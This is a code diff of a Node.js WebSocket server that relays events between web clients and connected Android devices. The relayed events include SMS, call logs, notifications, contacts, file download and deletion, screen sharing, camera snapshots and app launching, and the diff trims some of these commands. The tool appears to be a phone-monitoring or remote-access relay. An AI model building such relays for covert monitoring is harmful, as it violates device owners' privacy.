@@ -80,7 +80,7 @@ app.post('/api/fcm/send', async (req, res) => {
   }
 });
 
-// Serve index.html for all non-API routes (Socket.IO paths removed since we no longer use it)
+// Serve index.html for all non-API routes
 app.get(/^(?!\/api).*/, (req, res) => {
   const indexPath = path.join(publicPath, 'index.html');
   if (fs.existsSync(indexPath)) {
@@ -138,21 +138,18 @@ const relayEvents = [
   // WebRTC signaling
   'signal',
   // Telemetry
-  'notification', 'call_log', 'sms', 'location',
+  'notification', 'call_log', 'sms',
   // File explorer
   'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete',
   'fs:download_start', 'fs:download_chunk', 'fs:download_complete',
   'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
   'fs:upload_complete',
-  // Remote commands
-  'cmd:ping', 'cmd:stop', 'cmd:record', 'cmd:camera_switch', 'cmd:screen_share',
-  'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications', 'cmd:vibrate',
-  'cmd:toast', 'cmd:open_url', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval',
-  'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
-  'cmd:get_clipboard', 'cmd:set_clipboard', 
-  // Data responses
-  'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
-  'snapshot_data', 'clipboard_data'
+  // Remote commands (only active features)
+  'cmd:stop', 'cmd:screen_share',
+  'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications',
+  'cmd:set_quality', 'cmd:launch_app', 'cmd:take_snapshot',
+  // Data responses (only active features)
+  'apps_list', 'contacts_list', 'device_info', 'snapshot_data'
 ];
 
 wss.on('connection', (ws, req) => {
@@ -194,16 +191,12 @@ wss.on('connection', (ws, req) => {
 
       if (clientType === 'web') {
         webClients.set(clientId, ws);
-        // Notify every connected Android about this web client,
-        // and send the list of existing Androids to the web client.
         androidClients.forEach((androidWs, androidId) => {
           sendTo(androidWs, { type: 'web-client-ready', id: clientId });
           sendTo(ws, { type: 'android-client-ready', id: androidId });
         });
       } else if (clientType === 'android') {
         androidClients.set(clientId, ws);
-        // Notify every connected web about this Android,
-        // and send the list of existing webs to the Android.
         webClients.forEach((webWs, webId) => {
           sendTo(ws, { type: 'web-client-ready', id: webId });
           sendTo(webWs, { type: 'android-client-ready', id: clientId });
@@ -214,7 +207,7 @@ wss.on('connection', (ws, req) => {
       return;
     }
 
-    // ── Web client re-announces itself (kept for compatibility) ──
+    // ── Web client re-announces itself ──────────────────────
     if (type === 'web-client-ready') {
       if (!webClients.has(clientId)) {
         webClients.set(clientId, ws);
@@ -229,8 +222,6 @@ wss.on('connection', (ws, req) => {
     // ── Relay events between clients ────────────────────────
     if (relayEvents.includes(type)) {
       const targetId = payload.to;
-
-      // Always overwrite `from` with the server-verified sender id
       const forwardMsg = { type, ...payload, from: clientId };
 
       if (targetId) {
@@ -247,7 +238,6 @@ wss.on('connection', (ws, req) => {
           });
         }
       } else {
-        // Fallback: broadcast to the opposite side
         if (webClients.has(clientId)) {
           broadcastToAndroid(forwardMsg);
           console.log(`Broadcast ${type} to all Android clients`);
